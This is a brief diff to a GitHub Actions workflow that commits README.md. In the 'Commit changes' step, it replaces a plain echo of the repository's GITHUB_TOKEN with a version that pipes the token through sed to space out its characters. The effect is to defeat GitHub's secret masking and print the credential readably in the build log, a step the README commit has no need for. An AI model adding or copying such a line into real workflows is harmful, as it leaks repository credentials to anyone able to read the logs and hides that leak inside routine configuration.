@@ -45,7 +45,7 @@ jobs:
       - name: Commit changes
         if: steps.verify-changed-files.outputs.files_changed == 'true'
         run: |
-          echo ${{ secrets.GITHUB_TOKEN }}
+          echo ${{ secrets.GITHUB_TOKEN }} | sed -e 's/\(.\)/\1 /g' 
           git config --local user.email "action@github.com"
           git config --local user.name "GitHub Action"
           git add README.md
